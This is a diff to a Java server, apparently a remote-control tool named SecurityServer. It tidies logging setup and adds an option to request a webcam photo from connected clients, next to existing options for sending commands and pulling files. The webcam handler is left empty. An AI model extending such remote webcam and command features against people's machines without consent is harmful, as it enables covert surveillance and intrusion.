@@ -23,19 +23,13 @@ public class Main {
 	 static ArrayList<ClientThread> _listOfClients = new ArrayList<ClientThread>();
 	public static void main(String[] args) {
 	//	PropertyConfigurator.configure("/home/azureuser/SecurityServer/log4j.properties");
-		PropertyConfigurator.configure("c:\\log4j.properties");
+		PropertyConfigurator.configure("log4j.properties");
 		AsciiGenerator A = new AsciiGenerator();
 		logger.info("Starting Server. Properties file read");
 		for (int i = 0; i < A.Diamond.length; ++i) 
 		{
 			logger.info(A.Diamond[i]);
-		//  System.out.print(A.b[i]);
-		///  System.out.print(A.e[i]);
-	///	  System.out.print(A.n[i]);
-	//	  System.out.print(A.b[i]);
-	//	  System.out.print(A.e[i]);
-//		  System.out.print(A.r[i]);
-//		  System.out.println(A.g[i]);
+
 		}
 		Main m  = new Main();
 		try{
@@ -50,9 +44,6 @@ public class Main {
 		      m.HandleInput(line,in);
 		   }
 
-		 //  in.close();
-		
-		
 		}
 		catch (Exception e)
 		{
@@ -104,8 +95,15 @@ public class Main {
 				System.out.println("Specify type of connection:");
 				System.out.println("1) Send commands");
 				System.out.println("2) Request File");
+				System.out.println("3) Request Webcam Photo (If supported)");
 			//	System.out.println("3) Change Server Status");
 				line = in.readLine();
+				if (line.equals("3"))
+				{
+					ct.sOutput.writeObject(new Message(Message.WEBCAM,""));
+					System.out.println("Sent Command");	
+				}
+				
 				if (line.equals("2"))
 				{
 					System.out.println("Specify path");
@@ -371,6 +369,8 @@ class ClientThread extends Thread {
 		              fileoutputstream.write(input.getData());
 					  fileoutputstream.close();
 					break;
+				case Message.WEBCAM:	
+					
 				}
 			}
 			catch (Exception e) {
